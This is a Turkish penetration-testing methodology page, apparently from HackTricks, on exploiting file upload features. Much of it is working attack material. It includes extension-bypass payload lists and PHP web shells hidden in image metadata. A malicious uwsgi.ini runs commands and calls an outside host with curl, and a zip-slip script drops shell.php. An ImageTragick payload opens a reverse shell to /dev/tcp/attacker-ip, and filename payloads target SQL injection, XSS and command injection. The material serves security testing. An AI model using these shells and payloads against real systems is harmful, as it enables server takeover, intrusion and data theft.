# Dosya Yükleme

{{#include ../../banners/hacktricks-training.md}}

## Dosya Yükleme Genel Metodoloji

Diğer faydalı uzantılar:

- **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
- **PHPv8'de Çalışma**: _.php_, _.php4_, ._php5_, .phtml_, .module_, .inc_, .hphp_, .ctp_
- **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
- **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
- **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
- **Flash**: _.swf_
- **Perl**: _.pl, .cgi_
- **Erlang Yaws Web Server**: _.yaws_

### Dosya uzantısı kontrollerini atlatma

1. Eğer uygulanıyorsa, **önceki uzantıları** **kontrol edin.** Ayrıca bazılarını **büyük harflerle** de deneyin: _pHp, .pHP5, .PhAr ..._
2. _Çalıştırma uzantısından önce geçerli bir uzantı **eklemeyi** **kontrol edin** (önceki uzantıları da kullanın):_
- _file.png.php_
- _file.png.Php5_
3. Sonuna **özel karakterler eklemeyi** deneyin. Burp kullanarak tüm **ascii** ve **Unicode** karakterleri **bruteforce** edebilirsiniz. (_Ayrıca daha önce bahsedilen **uzantıları** de kullanmayı deneyebilirsiniz_)  
- _file.php%20_
- _file.php%0a_
- _file.php%00_
- _file.php%0d%0a_
- _file.php/_
- _file.php.\\_
- _file._
- _file.php...._
- _file.pHp5...._
4. Sunucu tarafındaki uzantı ayrıştırıcısını **kandırarak** korumaları atlatmayı deneyin; örneğin **uzantıyı ikileme** veya uzantılar arasına **çöp** veri (**null bytes**) ekleme gibi teknikler. _Daha iyi bir payload hazırlamak için **önceki uzantıları** de kullanabilirsiniz._
- _file.png.php_
- _file.png.pHp5_
- _file.php#.png_
- _file.php%00.png_
- _file.php\x00.png_
- _file.php%0a.png_
- _file.php%0d%0a.png_
- _file.phpJunk123png_
5. Önceki kontrole **başka bir uzantı katmanı** ekleyin:
- _file.png.jpg.php_
- _file.php%00.png%00.jpg_
6. **Çalıştırma uzantısını** geçerli uzantıdan **önce koymayı** deneyin ve sunucunun yanlış yapılandırılmış olmasını umun. (Apache yanlış yapılandırmalarını istismar etmek için faydalıdır; bazı durumlarda herhangi bir dosya uzantısı **.php** içeriyorsa, dosyanın sonu **.php** olmasa bile kod çalıştırılabilir):
- _ex: file.php.png_
7. **Windows** üzerinde **NTFS alternate data stream (ADS)** kullanımı. Bu durumda yasaklı bir uzantıdan sonra ve izin verilen uzantıdan önce iki nokta üst üste ":" karakteri eklenir. Sonuç olarak sunucuda **yasaklı uzantıya sahip boş bir dosya** oluşturulur (ör. "file.asax:.jpg"). Bu dosya daha sonra kısa dosya adı gibi başka tekniklerle düzenlenebilir. "**::$data**” deseni de boş olmayan dosyalar oluşturmak için kullanılabilir. Bu nedenle, bu desenin sonuna bir nokta eklemek daha fazla kısıtlamayı atlatmak için faydalı olabilir (ör. "file.asp::$data.").
8. Dosya adı sınırlarını **aşmayı** deneyin. Geçerli uzantı kesilir ve kötü amaçlı PHP geride kalır. AAA<--SNIP-->AAA.php

```
# Linux maximum 255 bytes
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # minus 4 here and adding .png
# Upload the file and check response how many characters it alllows. Let's say 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Make the payload
AAA<--SNIP 232 A-->AAA.php.png
```

### Content-Type, Magic Number, Sıkıştırma ve Yeniden Boyutlandırmayı Atlatma

- **Content-Type** kontrollerini atlatmak için **Content-Type** başlığının değerini şu şekilde ayarlayın: _image/png_ , _text/plain , application/octet-stream_
1. Content-Type **wordlist**: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt)
- **Magic number** kontrolünü atlatmak için dosyanın başına gerçek bir görüntünün **baytlarını** ekleyin (file komutunu yanıltmak için). Veya shell'i **metadata** içine yerleştirin:\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` veya payload'u doğrudan bir görüntüye de ekleyebilirsiniz:\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
- Eğer görüntünüze **sıkıştırma** uygulanıyorsa (ör. PHP-GD gibi kütüphaneler kullanılıyorsa), önceki teknikler işe yaramayabilir. Ancak **PLTE chunk** [**burada tanımlanan teknik**]ı kullanarak sıkıştırmadan **kurtulacak** metin ekleyebilirsiniz.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_plte_png.php)
- Web sayfası ayrıca görüntüyü **yeniden boyutlandırıyor** olabilir; örneğin PHP-GD fonksiyonları `imagecopyresized` veya `imagecopyresampled` kullanılarak. Ancak **IDAT chunk** [**burada tanımlanan teknik**] yardımıyla sıkıştırmadan **sağ kurtulacak** metinler ekleyebilirsiniz.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_idat_png.php)
- Görüntü yeniden boyutlandırmayı atlatan başka bir teknik, PHP-GD fonksiyonu `thumbnailImage` kullanarak payload oluşturmadır. Bunun yerine **tEXt chunk** [**burada tanımlanan teknik**] ile sıkıştırmadan **sağ kurtulacak** metin ekleyebilirsiniz.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_tEXt_png.php)

### Kontrol edilecek Diğer İpuçları

- Yüklenen dosyanın adını değiştirebilecek bir açık bulun (uzantıyı değiştirmek için).
- Backdoor'u çalıştırmak için bir **Local File Inclusion** zafiyeti bulun.
- **Olası Bilgi sızıntısı**:
1. **Aynı dosyayı** **aynı isimle** **birden çok kez** (ve aynı anda) yükleyin.
2. Zaten var olan bir **dosya** veya **klasör** adını kullanarak dosya yükleyin.
3. Dosya adı olarak **"."**, **".."** veya **"..."** kullanarak yükleme yapın. Örneğin, Apache üzerinde **Windows** ise uygulama yüklenen dosyaları "/www/uploads/" dizinine kaydediyorsa, "." dosya adı "/www/" dizininde "uploads" adlı bir dosya oluşturacaktır.
4. **NTFS** üzerinde silinmesi zor olabilecek bir dosya yükleyin, örneğin **"..:.jpg"**. (Windows)
5. Windows'ta dosya adına `|<>*?”` gibi **geçersiz karakterler** koyarak yükleyin. (Windows)
6. Windows'ta CON, PRN, AUX, NUL, COM1...COM9, LPT1...LPT9 gibi **ayrılmış (forbidden) isimleri** kullanarak dosya yükleyin.
- Ayrıca bir **executable** (.exe) veya daha az şüpheli bir **.html** yüklemeyi deneyin; kurban yanlışlıkla açtığında kod çalıştırabilir.

### Özel uzantı taktikleri

Eğer dosyaları bir **PHP server**'a yüklüyorsanız, kod çalıştırmak için [**.htaccess** taktiğine bakın](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html#code-execution).\
Eğer dosyaları bir **ASP server**'a yüklüyorsanız, kod çalıştırmak için [**.config** taktiğine bakın](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files).

`.phar` dosyaları Java için `.jar` gibidir, ama php içindir ve **php dosyası gibi kullanılabilir** (php ile çalıştırılabilir veya bir script içine include edilebilir...)

`.inc` uzantısı bazen sadece **import** edilen php dosyaları için kullanılır; dolayısıyla bir yerde bu uzantının **çalıştırılmasına izin verilmiş** olabilir.

## **Jetty RCE**

Eğer bir Jetty sunucusuna XML dosyası yükleyebiliyorsanız, [yeni \*.xml ve \*.war dosyaları otomatik olarak işlendiği için RCE elde edebilirsiniz](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)**.** Bu yüzden, aşağıdaki görselde belirtildiği gibi XML dosyasını `$JETTY_BASE/webapps/` dizinine yükleyin ve shell bekleyin!

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../images/image (1047).png>)

## **uWSGI RCE**

Detaylı inceleme için orijinal araştırmayı kontrol edin: [uWSGI RCE Exploitation](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html).

Remote Command Execution (RCE) zafiyetleri, `.ini` yapılandırma dosyasını değiştirme imkanı olan uWSGI sunucularında istismar edilebilir. uWSGI konfigürasyon dosyaları, "magic" değişkenleri, yer tutucuları ve operatörleri içerebilen özel bir sözdizimi kullanır. Özellikle `@(filename)` şeklinde kullanılan '@' operatörü bir dosyanın içeriğini dahil etmek için tasarlanmıştır. uWSGI tarafından desteklenen çeşitli şemalar arasında "exec" şeması özellikle güçlüdür ve bir sürecin standart çıktısından veri okumaya izin verir. Bir `.ini` dosyası işlendiğinde bu özellik, Remote Command Execution veya Arbitrary File Write/Read gibi kötü amaçlı işlemler için manipüle edilebilir.

Aşağıda çeşitli şemaları gösteren zararlı bir `uwsgi.ini` dosyasına örnek verilmektedir:
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
Payload'un çalıştırılması, yapılandırma dosyasının parse edilmesi sırasında gerçekleşir. Yapılandırmanın etkinleştirilip parse edilmesi için uWSGI sürecinin ya yeniden başlatılması (potansiyel olarak bir çökme sonrası veya bir Denial of Service attack nedeniyle) ya da dosyanın auto-reload olarak ayarlanması gerekir. Auto-reload özelliği etkinse, değişiklik algılandığında dosyayı belirli aralıklarla yeniden yükler.

uWSGI'nin yapılandırma dosyası parsing'inin gevşek doğasını anlamak çok önemlidir. Özellikle, burada tartışılan payload bir binary file içine (örneğin bir image veya PDF) yerleştirilebilir; bu da potansiyel exploit kapsamını daha da genişletir.

## **wget File Upload/SSRF Trick**

Bazı durumlarda bir sunucunun **`wget`** kullanarak **dosya indirdiğini** ve sizin **URL** belirtebildiğinizi görebilirsiniz. Bu gibi durumlarda, kod indirilen dosyaların uzantısının bir beyaz listede olup olmadığını kontrol ediyor olabilir; böylece yalnızca izin verilen dosyalar indirilecek. Ancak, **bu kontrol atlatılabilir.**\
**linux**'da bir **filename**'in **maximum** uzunluğu **255**'tir, ancak **wget** dosya adlarını **236** karaktere kısaltır. **"A"\*232+".php"+".gif"** adlı bir dosyayı **download** edebilirsiniz; bu dosya adı **kontrolü** **atlatır** (bu örnekte **".gif"** geçerli bir uzantıdır) fakat `wget` dosyayı **"A"\*232+".php"** olarak **yeniden adlandırır**.
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
```
Note that **başka bir seçenek** olarak aklınıza gelebilecek bu kontrolü atlatma yöntemi, **HTTP server**ın farklı bir dosyaya yönlendirme yapmasını sağlamaktır; böylece başlangıçtaki URL kontrolü atlatır fakat wget yönlendirilmiş dosyayı yeni isimle indirir. Bu **çalışmaz** **eğer** wget **--trust-server-names** parametresi ile kullanılmıyorsa çünkü **wget, yönlendirilen sayfayı orijinal URL’de belirtilen dosya adıyla indirecektir**.

## Tools

- [Upload Bypass](https://github.com/sAjibuu/Upload_Bypass) Pentesters ve Bug Hunters’ın file upload mekanizmalarını test etmelerine yardımcı olmak için tasarlanmış güçlü bir araçtır. Bug bounty tekniklerini kullanarak web uygulamalarındaki zafiyetleri tespit etmeyi ve sömürmeyi kolaylaştırır, kapsamlı değerlendirmeler sağlar.

### Corrupting upload indices with snprintf quirks (historical)

Tek dosya upload’ından çoklu dosya dizileri oluşturmak için `snprintf()` veya benzeri fonksiyonları kullanan bazı eski upload handler’lar, `_FILES` yapısını sahteleyerek kandırılabilir. `snprintf()` davranışındaki tutarsızlıklar ve truncation nedeniyle, dikkatle hazırlanmış tek bir upload, sunucu tarafında birden çok indekslenmiş dosya gibi görünebilir; bu da katı bir yapı varsayan mantığı (ör. çoklu dosya upload’u olarak ele alıp güvensiz dallara girmek) şaşırtabilir. Günümüzde nadir olmakla birlikte bu “index corruption” kalıbı zaman zaman CTF’lerde ve daha eski kod tabanlarında tekrar ortaya çıkar.

## From File upload to other vulnerabilities

- Set **filename** to `../../../tmp/lol.png` and try to achieve a **path traversal**
- Set **filename** to `sleep(10)-- -.jpg` and you may be able to achieve a **SQL injection**
- Set **filename** to `<svg onload=alert(document.domain)>` to achieve a XSS
- Set **filename** to `; sleep 10;` to test some command injection (more [command injections tricks here](../command-injection.md))
- [**XSS** in image (svg) file upload](../xss-cross-site-scripting/index.html#xss-uploading-files-svg)
- **JS** file **upload** + **XSS** = [**Service Workers** exploitation](../xss-cross-site-scripting/index.html#xss-abusing-service-workers)
- [**XXE in svg upload**](../xxe-xee-xml-external-entity.md#svg-file-upload)
- [**Open Redirect** via uploading svg file](../open-redirect.md#open-redirect-uploading-svg-files)
- Try **different svg payloads** from [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)
- [Famous **ImageTrick** vulnerability](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
- Eğer web sunucusuna bir URL’den image almasını **belirtebiliyorsanız**, bir [SSRF](../ssrf-server-side-request-forgery/index.html) suistimal etmeyi deneyebilirsiniz. Eğer bu **image** bir **public** site’de **kaydedilecekse**, ayrıca [https://iplogger.org/invisible/](https://iplogger.org/invisible/) adresinden bir URL belirleyip **her ziyaretçinin bilgisini çalabilirsiniz**.
- [**XXE and CORS** bypass with PDF-Adobe upload](pdf-upload-xxe-and-cors-bypass.md)
- XSS için özel hazırlanmış PDF’ler: [aşağıdaki sayfa nasıl **PDF verisi enjekte edilip JS yürütüleceğini** gösteriyor](../xss-cross-site-scripting/pdf-injection.md). Eğer PDF yükleyebiliyorsanız, verilen yönergelere göre rastgele JS çalıştıracak bir PDF hazırlayabilirsiniz.
- Sunucuda herhangi bir **antivirus** olup olmadığını kontrol etmek için \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) içeriğini yükleyin
- Dosya yüklerken herhangi bir **boyut limiti** olup olmadığını kontrol edin

İşte upload ile başarabileceğiniz şeylerden bir top 10 listesi (kaynak: [here](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: Stored XSS / SSRF / XXE
3. **GIF**: Stored XSS / SSRF
4. **CSV**: CSV injection
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : HTML injection / XSS / Open redirect
8. **PNG / JPEG**: Pixel flood attack (DoS)
9. **ZIP**: RCE via LFI / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

#### Burp Extension


{{#ref}}
https://github.com/portswigger/upload-scanner
{{#endref}}

## Magic Header Bytes

- **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03["`
- **JPG**: `"\xff\xd8\xff"`

Diğer dosya tipleri için [https://en.wikipedia.org/wiki/List_of_file_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) adresine bakın.

## Zip/Tar File Automatically decompressed Upload

Eğer sunucuda açılacak şekilde bir ZIP upload edebiliyorsanız, iki şey yapabilirsiniz:

### Symlink

Diğer dosyalara soft link içeren bir link yükleyin; ardından açılan dosyalara eriştiğinizde linklenmiş dosyalara erişmiş olursunuz:
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### Farklı klasörlere açma

Sıkıştırmayı açma sırasında dosyaların dizinlerde beklenmedik şekilde oluşturulması ciddi bir sorundur. Bu yapılandırmanın malicious file uploads yoluyla OS-level command execution'a karşı koruma sağlayacağı ilk varsayımlarına rağmen, ZIP arşiv formatının hiyerarşik sıkıştırma desteği ve directory traversal yetenekleri kötüye kullanılabilir. Bu, saldırganların kısıtlamaları aşmasına ve hedef uygulamanın decompression işlevini manipüle ederek güvenli upload dizinlerinden kaçmasına olanak tanır.

Böyle dosyaları oluşturmak için otomatik bir exploit [**evilarc on GitHub**](https://github.com/ptoomey3/evilarc) adresinde mevcuttur. Araç şu şekilde kullanılabilir:
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
Ek olarak, **symlink trick with evilarc** bir seçenektir. Eğer amaç `/flag.txt` gibi bir dosyayı hedeflemekse, sisteminizde o dosyaya işaret eden bir symlink oluşturmalısınız. Bu, evilarc'ın çalışma sırasında hatalarla karşılaşmamasını sağlar.

Aşağıda kötü amaçlı bir zip dosyası oluşturmak için kullanılan Python örnek kodu bulunmaktadır:
```python
#!/usr/bin/python
import zipfile
from io import BytesIO

def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**File spraying için sıkıştırmanın kötüye kullanımı**

Daha fazla ayrıntı için **orijinal gönderiyi inceleyin**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

1.  **PHP Shell Oluşturma**: PHP kodu, `$_REQUEST` değişkeniyle geçirilen komutları çalıştıracak şekilde yazılır.

```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```

2.  **File Spraying ve Sıkıştırılmış Dosya Oluşturma**: Birden fazla dosya oluşturulur ve bu dosyaları içeren bir zip arşivi hazırlanır.

```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```

3.  **Hex Editor veya vi ile Değişiklik**: Zip içindeki dosya adları vi veya bir hex editor ile değiştirilir; "xxA" dizinler arası geçiş yapmak için "../" ile değiştirilir.

```bash
:set modifiable
:%s/xxA/..\//g
:x!
```

## ImageTragic

Bu içeriği bir image uzantısıyla yükleyerek zafiyeti istismar edin **(ImageMagick , 7.0.1-1)** (exploit için: [exploit](https://www.exploit-db.com/exploits/39767))
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## PNG içinde PHP Shell Gömme

Bir PNG dosyasının IDAT chunk'ına PHP shell gömmek, belirli görüntü işleme operasyonlarını etkili şekilde atlatabilir. PHP-GD'den `imagecopyresized` ve `imagecopyresampled` fonksiyonları bu bağlamda özellikle önemlidir; bunlar sırasıyla görüntüleri yeniden boyutlandırmak ve yeniden örneklemek için yaygın olarak kullanılır. Gömülü PHP shell'in bu işlemlerden etkilenmeden kalabilmesi, bazı kullanım durumları için önemli bir avantaj sağlar.

Bu tekniğin metodolojisi ve olası uygulamalarını içeren ayrıntılı bir inceleme şu makalede bulunuyor: ["Encoding Web Shells in PNG IDAT chunks"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/). Bu kaynak süreç ve etkileri hakkında kapsamlı bir anlayış sunar.

Daha fazla bilgi: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## Polyglot Dosyalar

Polyglot dosyalar, siber güvenlikte benzersiz bir araç olarak hizmet eder; aynı anda birden fazla dosya formatında geçerli şekilde bulunabilen kamuflajcılar gibi davranırlar. İlginç bir örnek [GIFAR](https://en.wikipedia.org/wiki/Gifar) — hem GIF hem de RAR arşivi olarak işlev gören hibrit bir dosyadır. Bu tür dosyalar sadece bu eşleşmeyle sınırlı değildir; GIF ve JS veya PPT ve JS gibi kombinasyonlar da mümkündür.

Polyglot dosyaların temel faydası, dosyaları tür bazında tarayan güvenlik önlemlerini aşma kapasitelerindedir. Çeşitli uygulamalarda yaygın uygulama, potansiyel olarak zararlı formatların (ör. JS, PHP veya Phar dosyaları) riskini azaltmak için yalnızca JPEG, GIF veya DOC gibi belirli dosya türlerine izin vermektir. Ancak bir polyglot, birden fazla dosya türünün yapısal kriterlerine uyduğunda, bu kısıtlamaları sessizce atlatabilir.

Uyarlanabilirliklerine rağmen, polyglot'lar sınırlamalarla karşılaşabilir. Örneğin, bir polyglot aynı anda bir PHAR dosyası (PHp ARchive) ve bir JPEG olabilir; ancak yükleme başarısı platformun dosya uzantısı politikalarına bağlı olabilir. Sistem izin verilen uzantılar konusunda katıysa, bir polyglot'un yalnızca yapısal ikiliği yüklemenin garantisi olmayabilir.

Daha fazla bilgi: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

### PDF gibi davranan geçerli JSON'lar yükleme

Bir PDF dosyası taklidi yaparak, izin verilmiyor olsa bile geçerli bir JSON dosyası yükleyerek dosya türü tespitlerinden nasıl kaçınılacağı (teknikler **[this blog post](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)**):

- **`mmmagic` library**: İlk 1024 byte içinde `%PDF` magic byte'ları olduğu sürece geçerli sayılır (örnek için yazıya bakın)
- **`pdflib` library**: JSON'un bir alanı içine sahte bir PDF formatı ekleyin ki kütüphane bunun bir pdf olduğunu sansın (örnek için yazıya bakın)
- **`file` binary**: Bir dosyadan maksimum 1048576 byte okuyabilir. Basitçe JSON'u bu boyuttan daha büyük yapın ki içeriği bir json olarak parse edemesin; sonra JSON'un içine gerçek bir PDF'in başlangıç kısmını koyun ve bunun PDF olduğunu düşünecektir

## Referanslar

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
- [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
- [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
- [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
- [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
- [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)
- [https://blog.doyensec.com/2025/01/09/cspt-file-upload.html](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)

{{#include ../../banners/hacktricks-training.md}}
